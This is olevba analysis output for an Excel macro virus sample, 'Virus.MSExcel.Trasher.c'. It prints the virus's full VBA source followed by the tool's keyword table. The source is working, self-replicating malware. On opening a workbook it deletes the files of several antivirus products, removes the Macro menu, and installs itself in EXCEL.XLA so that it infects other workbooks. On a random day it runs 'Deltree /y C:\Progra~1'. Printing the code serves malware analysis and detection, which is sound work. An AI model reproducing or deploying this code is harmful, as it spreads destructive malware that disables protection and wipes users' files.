olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Trasher.c-e8912e35b3463c27f830f7052bf11a38fc4877d6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet3.bas 
in file: Virus.MSExcel.Trasher.c-e8912e35b3463c27f830f7052bf11a38fc4877d6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\FindVirus\*.*"
MenuBars(xlModule).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\f-macro\*.*"
MenuBars(xlNoDocuments).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
MenuBars(xlInfo).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\McAfee\VirusScan\*.*"
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
Kill "C:\Program Files\Norton AntiVirus\*.*"
Call Enigma
If CHG() Then
GoTo EBU:
Else
Call ING
End If
EBU:
Application.OnSheetActivate = "EXCEL.XLA!DIB"
End2:
End Sub

Function CHG() As Boolean
Attribute CHG.VB_ProcData.VB_Invoke_Func = " \n14"
CHG = False
For q = 1 To Application.Workbooks.Count
If Application.Workbooks(q).Name = "EXCEL.XLA" Then
For u = 1 To Application.Workbooks("EXCEL.XLA").Modules.Count
If Application.Workbooks("EXCEL.XLA").Modules(u).Name = "Sheet3" Then
CHG = True
End If
Next u
End If
Next q
End Function

Function ING()
Attribute ING.VB_ProcData.VB_Invoke_Func = " \n14"
ab = ActiveWorkbook.Name
Workbooks(ab).SaveCopyAs Application.StartupPath + "\EXCEL.XLA"
Workbooks.Open (Application.StartupPath + "\EXCEL.XLA")
Windows("EXCEL.XLA").Visible = False
Application.Workbooks("EXCEL.XLA").Save
End Function

Function ADI() As Boolean
Attribute ADI.VB_ProcData.VB_Invoke_Func = " \n14"
ac = ActiveWorkbook.Name
ADI = False
For y = 1 To Application.Workbooks(ac).Modules.Count
If Application.Workbooks(ac).Modules(y).Name = "Sheet3" Then
ADI = True
End If
Next y
End Function

Sub DIB()
Attribute DIB.VB_ProcData.VB_Invoke_Func = " \n14"
ad = ActiveWorkbook.Name
If ADI() Then
GoTo KI
End If
Application.ScreenUpdating = False
Application.Windows("EXCEL.XLA").Visible = True
Workbooks("EXCEL.XLA").Activate
Sheets("Sheet3").Visible = True
Workbooks("EXCEL.XLA").Sheets("Sheet3").Copy Before:=Workbooks(ad).Sheets(1)
Workbooks(ad).Sheets("Sheet3").Visible = False
Workbooks("EXCEL.XLA").Sheets("Sheet3").Visible = False
Windows("EXCEL.XLA").Visible = False
KI:
Close
End Sub

Sub Enigma()
Attribute Enigma.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
If Day(Now()) = Int((31 * Rnd) + 1) Then
Shell ("Deltree  /y C:\Progra~1")
Do
MsgBox "Your computer is infected XM.Enigma virus by ULTRAS", 16, "ULTRAS"
Loop
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

